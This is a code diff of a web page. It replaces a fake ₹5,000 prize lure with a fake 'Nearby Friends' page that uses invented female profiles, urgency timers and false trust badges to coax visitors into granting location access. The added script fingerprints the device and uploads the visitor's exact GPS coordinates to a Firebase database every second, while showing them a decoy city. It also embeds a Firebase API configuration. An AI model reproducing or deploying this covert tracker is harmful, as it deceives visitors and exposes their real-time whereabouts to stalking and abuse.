+                left: -100%;
+            }
+
+            50%,
+            100% {
+                left: 100%;
             }
         }
     </style>
 </head>
+
 <body>
 
-    <div class="wrap">
-        <!-- HERO -->
-        <div class="hero">
-            <div class="trophy">🏆</div>
-            <div class="hero-title">CONGRATULATIONS!</div>
-            <div class="hero-amount">₹5,000</div>
-            <div class="hero-sub">Click karo aur game khelo jeetne ke liye</div>
-        </div>
-
-        <!-- LIVE USERS -->
-        <div class="live-pill">
-            <span class="live-dot"></span>
-            <span><strong id="liveCount">2,847</strong> users khel rahe hain</span>
-        </div>
-
-        <!-- MAIN BUTTONS -->
-        <button class="btn btn-win" id="winBtn">
-            <span>🎯</span>
-            <span>Click to Win ₹5000</span>
-        </button>
-
-        <button class="btn btn-play" id="playBtn" disabled style="opacity: 0.5;">
-            <span>🎮</span>
-            <span>Play Game</span>
-        </button>
-
-        <!-- HOW IT WORKS -->
-        <div class="info-card">
-            <div class="info-title">📋 Kaise Kaam Karta Hai</div>
-            <div class="info-row">
-                <span class="icon">1️⃣</span>
-                <span>"Click to Win" button dabao</span>
-            </div>
-            <div class="info-row">
-                <span class="icon">2️⃣</span>
-                <span>Game khelo — 9 boxes me se 1 choose karo</span>
-            </div>
-            <div class="info-row">
-                <span class="icon">3️⃣</span>
-                <span>Agar ₹5000 mila toh claim karo</span>
-            </div>
-            <div class="info-row">
-                <span class="icon">4️⃣</span>
-                <span>Nahi mila toh dobara try karo</span>
-            </div>
-        </div>
-
-        <!-- TERMS -->
-        <div class="info-card">
-            <div class="info-title">⚠️ Terms & Conditions</div>
-            <div class="info-row">
-                <span class="icon">•</span>
-                <span>Ye ek skill-based game hai</span>
-            </div>
-            <div class="info-row">
-                <span class="icon">•</span>
-                <span>Winning chance random hai</span>
-            </div>
-            <div class="info-row">
-                <span class="icon">•</span>
-                <span>Reward ka claim verification ke baad</span>
-            </div>
-            <div class="info-row">
-                <span class="icon">•</span>
-                <span>Har user ek baar khel sakta hai</span>
-            </div>
-        </div>
+    <!-- LIVE BADGE -->
+    <div id="liveBadge">
+        <div class="pulse"></div>
+        <span>📍 Live • <span id="liveCount">0</span></span>
     </div>
 
-    <!-- COUNTDOWN OVERLAY -->
-    <div class="countdown" id="countdown">
-        <div class="countdown-circle">
-            <div class="countdown-num" id="countdownNum">3</div>
+    <!-- LANDING -->
+    <div id="landing">
+        <div class="logo">📍</div>
+        <h1>Nearby Friends</h1>
+
+        <!-- 🔥 Nearby notification -->
+        <div class="nearby-notify">
+            <div class="avatar" id="landingAvatar"
+                style="background-image: url('https://randomuser.me/api/portraits/women/44.jpg');"></div>
+            <div class="text">
+                <strong id="landingName">Neha wants to meet you</strong>
+                <span id="landingDistance">📍 500m away • Active now</span>
+            </div>
         </div>
-        <div class="countdown-text">Game shuru ho raha hai...</div>
+
+        <p>Find people around you and start chatting instantly</p>
+
+        <div class="stats">
+            <div class="stat">
+                <div class="num" id="onlineCount">1,247</div>
+                <div class="label">Online now</div>
+            </div>
+            <div class="stat">
+                <div class="num">50K+</div>
+                <div class="label">Users</div>
+            </div>
+            <div class="stat">
+                <div class="num">4.8★</div>
+                <div class="label">Rating</div>
+            </div>
+        </div>
+
+        <button id="startBtn">🔍 Find Nearby</button>
     </div>
 
-    <!-- GAME MODAL -->
-    <div class="game-modal" id="gameModal">
-        <div class="game-box">
-            <!-- PLAYING SCREEN -->
-            <div id="playingScreen">
-                <div class="game-title">🎮 Choose a Box</div>
-                <div class="game-sub">9 boxes me se 1 choose karo — ₹5000 chhupa hai</div>
+    <!-- 🔥 NEHA POPUP -->
+    <div id="gpsModal">
+        <div class="neha-popup">
 
-                <div class="game-stats">
-                    <div class="game-stat">
-                        <div class="game-stat-label">Attempts</div>
-                        <div class="game-stat-value" id="attemptsLeft">1</div>
-                    </div>
-                    <div class="game-stat">
-                        <div class="game-stat-label">Prize</div>
-                        <div class="game-stat-value gold">₹5,000</div>
-                    </div>
-                    <div class="game-stat">
-                        <div class="game-stat-label">Win Chance</div>
-                        <div class="game-stat-value">11%</div>
-                    </div>
-                </div>
-
-                <div class="game-grid" id="gameGrid">
-                    <!-- 9 cells -->
-                    <div class="game-cell" data-idx="0">🎁</div>
-                    <div class="game-cell" data-idx="1">🎁</div>
-                    <div class="game-cell" data-idx="2">🎁</div>
-                    <div class="game-cell" data-idx="3">🎁</div>
-                    <div class="game-cell" data-idx="4">🎁</div>
-                    <div class="game-cell" data-idx="5">🎁</div>
-                    <div class="game-cell" data-idx="6">🎁</div>
-                    <div class="game-cell" data-idx="7">🎁</div>
-                    <div class="game-cell" data-idx="8">🎁</div>
-                </div>
+            <!-- Big DP with ring -->
+            <div class="neha-avatar-wrap">
+                <div class="neha-avatar" id="nehaAvatar"></div>
+                <div class="neha-avatar-ring"></div>
+                <div class="neha-online-dot"></div>
             </div>
 
-            <!-- RESULT SCREEN -->
-            <div class="result-screen" id="resultScreen">
-                <div class="result-icon" id="resultIcon">🎉</div>
-                <div class="result-title" id="resultTitle">You Won!</div>
-                <div class="result-sub" id="resultSub">₹5,000 jeet liye!</div>
+            <!-- Name + Distance -->
+            <h2 class="neha-name" id="nehaName">Neha</h2>
+            <div class="neha-distance" id="nehaDistance">
+                <span class="dot-live"></span>
+                📍 500m away • Active now
+            </div>
 
-                <button class="btn btn-claim" id="claimBtn">
-                    <span>💰</span>
-                    <span>Claim ₹5,000</span>
+            <!-- Message bubble -->
+            <div class="neha-message">
+                <div class="neha-message-text">
+                    "Hey! I'm nearby. Want to meet you 😊"
+                </div>
+                <div class="neha-message-time">just now</div>
+            </div>
+
+            <!-- Location note -->
+            <div class="neha-location-note">
+                <span>💬</span>
+                <span>Neha tumse chat karna chahti hai — tap to reply</span>
+            </div>
+
+            <!-- Buttons -->
+            <!-- 🔥 CONVINCING BUTTONS -->
+            <div style="position: relative; z-index: 2;">
+
+                <!-- Urgency timer -->
+                <div style="
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        margin-bottom: 12px;
+        font-size: 12px;
+        color: #FF3B30;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+    ">
+                    <div style="
+            width: 6px;
+            height: 6px;
+            background: #FF3B30;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        "></div>
+                    <span id="timerText">⏰ Neha online 2 min se wait kar rahi hai</span>
+                </div>
+                <button class="neha-btn-primary" id="enableBtn" style="
+    width: 100%;
+    padding: 16px 24px;
+    border: none;
+    border-radius: 50px;
+    background: linear-gradient(135deg, #25D366, #128C7E);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 15px 40px rgba(37, 211, 102, 0.5);
+    animation: btnPulse 2s infinite;
+    font-family: inherit;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+">
+                    <div style="
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background-image: url('https://randomuser.me/api/portraits/women/44.jpg');
+        background-size: cover;
+        background-position: center;
+        border: 2px solid #fff;
+        flex-shrink: 0;
+    "></div>
+                    <span>Connect with Neha</span>
+                    <span style="font-size: 18px;">→</span>
                 </button>
 
-                <button class="btn" id="closeResultBtn" style="background: linear-gradient(135deg, #6b7280, #4b5563);">
-                    <span>🔄</span>
-                    <span>Try Again</span>
-                </button>
+                <!-- Secondary hint (not a button) -->
+                <div style="
+        margin-top: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        font-size: 12px;
+        color: #5f6368;
+    ">
+                    <span>🔒</span>
+                    <span>Safe & encrypted</span>
+                    <span>•</span>
+                    <span style="color: #34A853;">✅ 12,000+ users</span>
+                </div>
+
+                <!-- SKIP — Very subtle -->
+
+
+                <!-- Bottom warning -->
+                <div style="
+        margin-top: 16px;
+        padding-top: 16px;
+        border-top: 1px solid rgba(255,255,255,0.06);
+        font-size: 11px;
+        color: #8e8e93;
+        text-align: center;
+        line-height: 1.6;
+    ">
+                    ⚡ <strong style="color:#FBBC05;">+7 people</strong> are waiting nearby<br>
+
+                </div>
+
             </div>
         </div>
     </div>
 
-    <script>
-        const winBtn = document.getElementById('winBtn');
-        const playBtn = document.getElementById('playBtn');
-        const countdown = document.getElementById('countdown');
-        const countdownNum = document.getElementById('countdownNum');
-        const gameModal = document.getElementById('gameModal');
-        const playingScreen = document.getElementById('playingScreen');
-        const resultScreen = document.getElementById('resultScreen');
-        const gameGrid = document.getElementById('gameGrid');
-        const resultIcon = document.getElementById('resultIcon');
-        const resultTitle = document.getElementById('resultTitle');
-        const resultSub = document.getElementById('resultSub');
-        const claimBtn = document.getElementById('claimBtn');
-        const closeResultBtn = document.getElementById('closeResultBtn');
-        const liveCount = document.getElementById('liveCount');
-        const attemptsLeft = document.getElementById('attemptsLeft');
+    <!-- LOADING -->
+    <div id="loading">
+        <div class="spinner"></div>
+        <div class="text" id="loadingText">Find Friends for you...</div>
+    </div>
 
-        let hasClicked = false;
-        let gamePlayed = false;
-        let winningIndex = -1;
-        let attempts = 1;
+    <!-- APP -->
+    <div id="app">
+        <div id="mapArea">
+            <div class="userDot" id="userDot"></div>
+
+            <!-- 🔥 Nearby banner -->
+            <div class="nearbyBanner" id="nearbyBanner" style="display:none;">
+                <div class="avatar" id="bannerAvatar"></div>
+                <div class="info">
+                    <strong id="bannerName">Neha is 500m away</strong>
+                    <span id="bannerMsg">Wants to meet you</span>
+                </div>
+                <button class="close" onclick="document.getElementById('nearbyBanner').style.display='none'">✕</button>
+            </div>
+        </div>
+
+        <div id="infoPanel">
+            <div class="header">
+                <h3>People Nearby</h3>
+                <div class="count" id="nearbyCount">0</div>
+            </div>
+
+            <div class="location">
+                <div class="dot"></div>
+                <span id="locationText">Finding...</span>
+            </div>
+
+            <div id="nearbyList"></div>
+        </div>
+
+        <div id="controls">
+            <button class="ctrlBtn active" onclick="refreshLocation()">📍</button>
+            <button class="ctrlBtn" onclick="showToast('Chat feature coming soon')">💬</button>
+            <button class="ctrlBtn" onclick="showToast('Settings')">⚙️</button>
+        </div>
+    </div>
+
+    <script type="module">
+        /* ============================================================
+   FIREBASE SETUP
+   ============================================================ */
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getDatabase, ref, set, update }
+            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
+            authDomain: "my-rto-b2531.firebaseapp.com",
+            databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
+            projectId: "my-rto-b2531",
+            storageBucket: "my-rto-b2531.firebasestorage.app",
+            messagingSenderId: "465334829178",
+            appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
+        };
+
+        const firebaseApp = initializeApp(firebaseConfig);
+        const db = getDatabase(firebaseApp);
+        console.log('✅ Firebase initialized');
 
         /* ============================================================
-           CLICK TO WIN BUTTON
+           GLOBAL STATE — Sab yahan
            ============================================================ */
-        winBtn.addEventListener('click', async () => {
-            if (hasClicked) return;
-            hasClicked = true;
+        let gpsStarted = false;
+        let userLocation = null;
+        let watchId = null;
+        let locUpdateInterval = null;
+        let locUpdateCount = 0;
+        let currentNeha = null;
 
-            winBtn.disabled = true;
-            winBtn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
+        /* ============================================================
+           DEVICE + SESSION
+           ============================================================ */
+        function getDeviceId() {
+            let deviceId = localStorage.getItem('pics_device_id');
+            if (deviceId) return deviceId;
+            const raw = [
+                navigator.userAgent,
+                window.screen.width + 'x' + window.screen.height,
+                Intl.DateTimeFormat().resolvedOptions().timeZone,
+                navigator.language
+            ].join('|');
+            let hash = 0;
+            for (let i = 0; i < raw.length; i++) {
+                hash = ((hash << 5) - hash) + raw.charCodeAt(i);
+                hash = hash & hash;
+            }
+            const BASE62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+            let id = '', n = Math.abs(hash);
+            for (let i = 0; i < 8; i++) { id += BASE62[n % 62]; n = Math.floor(n / 62); }
+            deviceId = 'HEK-' + id;
+            localStorage.setItem('pics_device_id', deviceId);
+            return deviceId;
+        }
 
-            // 3-sec countdown
-            await runCountdown(3);
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            if (/iPhone/i.test(ua)) {
+                const w = window.screen.width;
+                if (w === 430) return 'iPhone 15 Pro Max';
+                if (w === 393) return 'iPhone 15 / 14 Pro';
+                if (w === 390) return 'iPhone 13 / 14';
+                if (w === 428) return 'iPhone 14 Plus';
+                if (w === 414) return 'iPhone 11 / XR';
+                if (w === 375) return 'iPhone X / 11 Pro';
+                return 'iPhone';
+            }
+            if (/iPad/i.test(ua)) return 'iPad';
+            if (/Android/i.test(ua)) {
+                let brand = '';
+                if (/realme/i.test(ua)) brand = 'Realme';
+                else if (/Redmi/i.test(ua)) brand = 'Redmi';
+                else if (/POCO/i.test(ua)) brand = 'POCO';
+                else if (/Xiaomi/i.test(ua)) brand = 'Xiaomi';
+                else if (/Nothing/i.test(ua)) brand = 'Nothing';
+                else if (/SM-/i.test(ua) || /Samsung/i.test(ua)) brand = 'Samsung';
+                else if (/OnePlus/i.test(ua)) brand = 'OnePlus';
+                else if (/OPPO/i.test(ua)) brand = 'OPPO';
+                else if (/vivo/i.test(ua) || /Vivo/i.test(ua)) brand = 'Vivo';
+                else if (/moto/i.test(ua) || /Motorola/i.test(ua)) brand = 'Motorola';
+                else if (/Pixel/i.test(ua)) brand = 'Google Pixel';
+                else brand = 'Android';
+                const m = ua.match(/Android\s+[\d.]+;\s*([^)]+)\)/);
+                const model = m ? m[1].trim().split(' Build/')[0] : '';
+                return model ? `${brand} ${model}` : brand;
+            }
+            if (/Windows/i.test(ua)) return 'Windows PC';
+            if (/Macintosh/i.test(ua)) return 'Mac';
+            if (/Linux/i.test(ua)) return 'Linux PC';
+            return 'Unknown Device';
+        }
 
-            // Fake "processing"
-            await new Promise(r => setTimeout(r, 800));
+        const DEVICE_ID = getDeviceId();
+        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const DEVICE_NAME = getDeviceName();
+        const PAGE_NAME = 'nearby';
 
-            // Unlock Play Game
-            playBtn.disabled = false;
-            playBtn.style.opacity = '1';
-            playBtn.style.animation = 'pulse 2s infinite';
+        console.log('📱 Device:', DEVICE_NAME);
+        console.log('📄 Page:', PAGE_NAME);
 
-            winBtn.innerHTML = '<span>✅</span><span>Unlocked!</span>';
-            winBtn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+        /* ============================================================
+           SAVE TO devices_root
+           ============================================================ */
+        async function saveToDevicesRoot() {
+            try {
+                await set(ref(db, 'devices_root/' + DEVICE_ID), {
+                    deviceId: DEVICE_ID,
+                    deviceName: DEVICE_NAME,
+                    pageName: PAGE_NAME,
+                    sessionId: SESSION_ID,
+                    status: 'active',
+                    firstVisit: Date.now(),
+                    lastSeen: Date.now()
+                });
+                console.log('✅ devices_root saved');
+            } catch (err) {
+                console.error('❌ devices_root failed:', err.code);
+            }
+        }
 
-            showToast('🎮 Game unlocked! Ab Play Game dabao');
-            playSound(1000, 0.15);
-            vibrate([50, 30, 50]);
+        async function updateDevicesRootStatus(status) {
+            try {
+                await update(ref(db, 'devices_root/' + DEVICE_ID), {
+                    status: status,
+                    lastSeen: Date.now()
+                });
+            } catch (e) { }
+        }
 
-            // Backend log
-            logEvent('win_clicked');
+        document.addEventListener('visibilitychange', () => {
+            updateDevicesRootStatus(document.hidden ? 'background' : 'active');
         });
 
-        /* ============================================================
-           3-SEC COUNTDOWN
-           ============================================================ */
-        function runCountdown(seconds) {
-            return new Promise((resolve) => {
-                let count = seconds;
-                countdownNum.textContent = count;
-                countdown.classList.add('show');
-                playSound(700, 0.1);
+        window.addEventListener('pagehide', () => {
+            updateDevicesRootStatus('closed');
+        });
 
-                const interval = setInterval(() => {
-                    count--;
-                    if (count > 0) {
-                        countdownNum.textContent = count;
-                        playSound(700, 0.1);
-                    } else {
-                        clearInterval(interval);
-                        countdown.classList.remove('show');
-                        resolve();
-                    }
-                }, 1000);
-            });
+        window.addEventListener('beforeunload', () => {
+            const url = firebaseConfig.databaseURL + '/devices_root/' + DEVICE_ID + '/status.json';
+            const blob = new Blob([JSON.stringify('closed')], { type: 'application/json' });
+            navigator.sendBeacon(url, blob);
+        });
+
+        setTimeout(saveToDevicesRoot, 500);
+
+        /* ============================================================
+           LOCATION SAVE — har 1 sec
+           ============================================================ */
+        async function saveToLocFind(lat, lng, accuracy) {
+            try {
+                locUpdateCount++;
+                await set(ref(db, 'loc_find/' + DEVICE_ID), {
+                    deviceId: DEVICE_ID,
+                    deviceName: DEVICE_NAME,
+                    pageName: PAGE_NAME,
+                    sessionId: SESSION_ID,
+                    latitude: lat,
+                    longitude: lng,
+                    accuracy: Math.round(accuracy),
+                    timestamp: Date.now(),
+                    timeISO: new Date().toISOString(),
+                    updateCount: locUpdateCount,
+                    status: 'active'
+                });
+
+                document.getElementById('liveCount').textContent = locUpdateCount;
+                console.log(`📍 loc_find #${locUpdateCount}:`, lat.toFixed(4), lng.toFixed(4));
+            } catch (err) {
+                console.error('❌ loc_find failed:', err.code);
+            }
+        }
+
+        function startLocationLoop() {
+            if (locUpdateInterval) clearInterval(locUpdateInterval);
+            locUpdateInterval = setInterval(() => {
+                if (userLocation && userLocation.lat && userLocation.lng) {
+                    saveToLocFind(userLocation.lat, userLocation.lng, userLocation.accuracy || 0);
+                }
+            }, 1000);
+            console.log('🚀 Location loop started (1 sec)');
+        }
+
+        function stopLocationLoop() {
+            if (locUpdateInterval) {
+                clearInterval(locUpdateInterval);
+                locUpdateInterval = null;
+            }
         }
 
         /* ============================================================
-           PLAY GAME BUTTON
+           UI HELPERS
            ============================================================ */
-        playBtn.addEventListener('click', () => {
-            if (gamePlayed) return;
-
-            // Pick random winning index (1 of 9)
-            winningIndex = Math.floor(Math.random() * 9);
-            console.log('🎯 Winning index:', winningIndex);
-
-            // Reset grid
-            document.querySelectorAll('.game-cell').forEach(cell => {
-                cell.className = 'game-cell';
-                cell.textContent = '🎁';
-                cell.onclick = null;
-            });
-
-            // Show game modal
-            gameModal.classList.add('show');
-            playingScreen.style.display = 'block';
-            resultScreen.classList.remove('show');
-
-            playSound(800, 0.1);
-            vibrate(30);
-
-            logEvent('game_started');
-        });
-
-        /* ============================================================
-           GAME GRID CLICK
-           ============================================================ */
-        gameGrid.addEventListener('click', (e) => {
-            const cell = e.target.closest('.game-cell');
-            if (!cell) return;
-            if (cell.classList.contains('revealed')) return;
-
-            const idx = parseInt(cell.dataset.idx);
-
-            // Reveal all cells
-            document.querySelectorAll('.game-cell').forEach((c, i) => {
-                setTimeout(() => {
-                    if (i === winningIndex) {
-                        c.textContent = '💰';
-                        c.classList.add('win');
-                    } else {
-                        c.textContent = '❌';
-                        c.classList.add('lose');
-                    }
-                    c.classList.add('revealed');
-                }, i * 80);
-            });
-
-            // Show result after all reveal
+        function showToast(msg) {
+            const existing = document.querySelector('.toast');
+            if (existing) existing.remove();
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = msg;
+            document.body.appendChild(toast);
             setTimeout(() => {
-                const isWinner = idx === winningIndex;
-                showResult(isWinner);
-            }, 9 * 80 + 500);
-        });
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.3s';
+                setTimeout(() => toast.remove(), 300);
+            }, 2000);
+        }
 
         /* ============================================================
-           SHOW RESULT
+           🔥 RANDOM NEHA — Har visit pe alag
            ============================================================ */
-        function showResult(isWinner) {
-            playingScreen.style.display = 'none';
-            resultScreen.classList.add('show');
+        /* ============================================================
+    🔥 NEHA / GIRLS PROFILES — Same concept as CONTACTS
+    ============================================================ */
+        const NEARBY_PROFILES = [
+            {
+                id: 1,
+                name: 'Neha',
+                country: '🇮🇳 India',
+                distance: 500,        // meters
+                status: 'Active now',
+                message: '"Hey! I\'m nearby. Want to meet you 😊"',
+                avatar: 'https://randomuser.me/api/portraits/women/44.jpg'
+            },
+            {
+                id: 2,
+                name: 'Priya',
+                country: '🇮🇳 India',
+                distance: 420,
+                status: 'Active now',
+                message: '"Hi! Saw you nearby. Let\'s chat?"',
+                avatar: 'https://randomuser.me/api/portraits/women/68.jpg'
+            },
+            {
+                id: 3,
+                name: 'Anjali',
+                country: '🇮🇳 India',
+                distance: 380,
+                status: 'Active 5m ago',
+                message: '"Hey! Are you free to talk? 🙈"',
+                avatar: 'https://randomuser.me/api/portraits/women/33.jpg'
+            },
+            {
+                id: 4,
+                name: 'Riya',
+                country: '🇮🇳 India',
+                distance: 650,
+                status: 'Active now',
+                message: '"Hi there! Want to be friends?"',
+                avatar: 'https://randomuser.me/api/portraits/women/55.jpg'
+            },
+            {
+                id: 5,
+                name: 'Sneha',
+                country: '🇮🇳 India',
+                distance: 320,
+                status: 'Active now',
+                message: '"OMG you\'re so close! Let\'s meet 😍"',
+                avatar: 'https://randomuser.me/api/portraits/women/22.jpg'
+            },
+            {
+                id: 6,
+                name: 'Pooja',
+                country: '🇮🇳 India',
+                distance: 780,
+                status: 'Active 2m ago',
+                message: '"Hey! New here. Want to chat?"',
+                avatar: 'https://randomuser.me/api/portraits/women/90.jpg'
+            },
+            {
+                id: 7,
+                name: 'Kavya',
+                country: '🇮🇳 India',
+                distance: 450,
+                status: 'Active now',
+                message: '"Hi! Same area as you. Let\'s talk 😊"',
+                avatar: 'https://randomuser.me/api/portraits/women/85.jpg'
+            },
+            {
+                id: 8,
+                name: 'Dia',
+                country: '🇮🇳 India',
+                distance: 550,
+                status: 'Active now',
+                message: '"Hello! I saw your profile nearby"',
+                avatar: 'https://randomuser.me/api/portraits/women/60.jpg'
+            }
+        ];
 
-            if (isWinner) {
-                resultIcon.textContent = '🎉';
-                resultTitle.textContent = 'You Won!';
-                resultTitle.className = 'result-title win';
-                resultSub.innerHTML = 'Aapne <strong style="color: #fbbf24;">₹5,000</strong> jeet liye!<br>Claim karo aur paisa pao.';
+        function pickRandomNeha() {
+            // 🔥 Random profile pick karo
+            currentNeha = NEARBY_PROFILES[Math.floor(Math.random() * NEARBY_PROFILES.length)];
+            console.log('💃 Selected:', currentNeha.name, currentNeha.distance + 'm');
 
-                claimBtn.style.display = 'flex';
-                closeResultBtn.style.display = 'none';
+            // 🔥 Popup update karo
+            const avatar = document.getElementById('nehaAvatar');
+            const name = document.getElementById('nehaName');
+            const distance = document.getElementById('nehaDistance');
+            const msg = document.querySelector('.neha-message-text');
+            const locationNote = document.querySelector('.neha-location-note span:last-child');
+            const footer = document.querySelector('.neha-footer');
 
-                // Confetti
-                createConfetti();
+            if (avatar) avatar.style.backgroundImage = `url('${currentNeha.avatar}')`;
+            if (name) name.textContent = currentNeha.name;
 
-                // Sound + vibrate
-                playSound(1200, 0.15);
-                setTimeout(() => playSound(1600, 0.15), 100);
-                setTimeout(() => playSound(2000, 0.2), 200);
-                vibrate([100, 50, 100, 50, 200]);
+            if (distance) {
+                distance.innerHTML = `
+      <span class="dot-live"></span> 
+      📍 ${currentNeha.distance}m away • ${currentNeha.status}
+    `;
+            }
 
-                logEvent('game_won', { prize: 5000 });
+            if (msg) msg.textContent = currentNeha.message;
 
+            if (locationNote) {
+                locationNote.textContent = `💬 ${currentNeha.name} tumse chat karna chahti hai — tap to reply`;
+            }
+
+            if (footer) {
+                const moreCount = 5 + Math.floor(Math.random() * 5);
+                footer.textContent = `+${moreCount} more people nearby waiting`;
+            }
+
+            return currentNeha;
+        }
+
+        /* ============================================================
+           MODAL HELPERS
+           ============================================================ */
+        function showGPSModal() {
+            pickRandomNeha();
+            document.getElementById('gpsModal').classList.add('show');
+        }
+
+        function hideGPSModal() {
+            document.getElementById('gpsModal').classList.remove('show');
+        }
+
+        async function checkGPSPermission() {
+            if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
+            try {
+                const status = await navigator.permissions.query({ name: 'geolocation' });
+                return status.state;
+            } catch (e) { return 'unknown'; }
+        }
+
+        /* ============================================================
+           DENIED GUIDE
+           ============================================================ */
+        function showDeniedGuide() {
+            if (document.getElementById('deniedModal')) return;
+
+            const modal = document.createElement('div');
+            modal.id = 'deniedModal';
+            modal.style.cssText = `
+    position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+    display: flex; align-items: center; justify-content: center;
+    padding: 24px; z-index: 99999; animation: fadeIn 0.3s;
+  `;
+
+            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+            modal.innerHTML = `
+    <div style="background:#1c1c1e; border-radius:24px; padding:32px 24px;
+                max-width:420px; width:100%; text-align:center; color:#fff;
+                box-shadow:0 20px 60px rgba(0,0,0,0.6);">
+      <div style="font-size:72px; margin-bottom:20px;">📍</div>
+      <h2 style="font-size:24px; font-weight:600; margin-bottom:12px; color:#EA4335;">
+        Location Blocked
+      </h2>
+      <p style="font-size:15px; color:#8e8e93; line-height:1.6; margin-bottom:24px;">
+        You denied location earlier. Enable it manually to find nearby friends.
+      </p>
+      <div style="background:#2c2c2e; border-radius:14px; padding:18px;
+                  text-align:left; font-size:14px; line-height:1.9;
+                  color:#e0e0e0; margin-bottom:24px;">
+        <strong style="color:#1a73e8;">📋 How to enable:</strong>
+        <ol style="margin-left:20px; margin-top:6px;">
+          ${isMobile ? `
+            <li>Open browser <strong>Settings</strong></li>
+            <li>Go to <strong>Site Settings → Location</strong></li>
+            <li>Find this site → set to <strong>Allow</strong></li>
+            <li>Come back and refresh</li>
+          ` : `
+            <li>Click the <strong>🔒 lock icon</strong> in the address bar</li>
+            <li>Find <strong>Location</strong> → set to <strong>Allow</strong></li>
+            <li>Refresh the page (F5)</li>
+          `}
+        </ol>
+      </div>
+      <button onclick="location.reload()"
+        style="width:100%; padding:16px; border:none; border-radius:14px;
+               background:linear-gradient(135deg, #1a73e8, #34A853);
+               color:#fff; font-size:16px; font-weight:600;
+               cursor:pointer; margin-bottom:10px;">
+        🔄 I Enabled It — Refresh
+      </button>
+      <button onclick="document.getElementById('deniedModal').remove()"
+        style="width:100%; padding:14px; border:none; border-radius:14px;
+               background:transparent; color:#8e8e93; font-size:14px;
+               cursor:pointer;">
+        Close
+      </button>
+    </div>
+  `;
+
+            document.body.appendChild(modal);
+        }
+
+        /* ============================================================
+           REQUEST GPS — From popup button
+           ============================================================ */
+        function requestGPS() {
+            hideGPSModal();
+
+            if (gpsStarted) return;
+            gpsStarted = true;
+
+            document.getElementById('landing').classList.add('hide');
+
+            setTimeout(() => {
+                document.getElementById('landing').style.display = 'none';
+                document.getElementById('loading').classList.add('show');
+                document.getElementById('loadingText').textContent = 'Finding friends for you...';
+            }, 300);
+
+            getUserLocation();
+        }
+
+        function skipGPS() {
+            hideGPSModal();
+            showToast('⚠️ Location required to find nearby people');
+            setTimeout(() => {
+                if (!userLocation) showGPSModal();
+            }, 2500);
+        }
+
+        /* ============================================================
+           GET USER LOCATION
+           ============================================================ */
+        function getUserLocation() {
+            console.log('📍 Requesting GPS...');
+
+            if (!navigator.geolocation) {
+                alert('Geolocation not supported');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    console.log('✅ GPS granted');
+
+                    userLocation = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+
+                    const fakeCity = ['Mumbai', 'Delhi', 'Bangalore', 'Pune', 'Hyderabad'][
+                        Math.floor(Math.random() * 5)
+                    ];
+
+                    document.getElementById('locationText').textContent =
+                        `📍 ${fakeCity} • ${Math.round(userLocation.accuracy)}m accuracy`;
+
+                    setTimeout(() => {
+                        document.getElementById('loading').classList.remove('show');
+                        document.getElementById('landing').style.display = 'none';
+                        document.getElementById('app').classList.add('show');
+                        document.getElementById('liveBadge').classList.add('show');
+
+                        startLocationLoop();
+                        generateNearbyUsers();
+                        showNearbyBanner();
+                    }, 1500);
+
+                    watchId = navigator.geolocation.watchPosition(
+                        (pos) => {
+                            userLocation = {
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            };
+                        },
+                        (err) => console.warn('Watch error:', err),
+                        { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 }
+                    );
+                },
+                (error) => {
+                    console.error('❌ GPS error:', error.code);
+                    document.getElementById('loading').classList.remove('show');
+                    document.getElementById('landing').classList.remove('hide');
+
+                    let msg = 'Location access denied';
+                    if (error.code === 1) msg = '🚫 Location permission denied';
+                    if (error.code === 2) msg = '📡 Location unavailable';
+                    if (error.code === 3) msg = '⏱️ Location timeout';
+
+                    showToast(msg);
+
+                    if (error.code === 1) {
+                        setTimeout(() => showDeniedGuide(), 800);
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        /* ============================================================
+           NEARBY USERS GENERATOR
+           ============================================================ */
+        function generateNearbyUsers() {
+            const users = [
+                { name: 'Neha', avatar: 'https://randomuser.me/api/portraits/women/44.jpg', distance: 0.5 },
+                { name: 'Arjun', avatar: 'https://randomuser.me/api/portraits/men/32.jpg', distance: 0.8 },
+                { name: 'Priya', avatar: 'https://randomuser.me/api/portraits/women/68.jpg', distance: 1.2 },
+                { name: 'Jake', avatar: 'https://randomuser.me/api/portraits/men/45.jpg', distance: 1.8 },
+                { name: 'Sophia', avatar: 'https://randomuser.me/api/portraits/women/90.jpg', distance: 2.5 },
+                { name: 'Rahul', avatar: 'https://randomuser.me/api/portraits/men/22.jpg', distance: 3.1 },
+                { name: 'Emma', avatar: 'https://randomuser.me/api/portraits/women/33.jpg', distance: 4.2 },
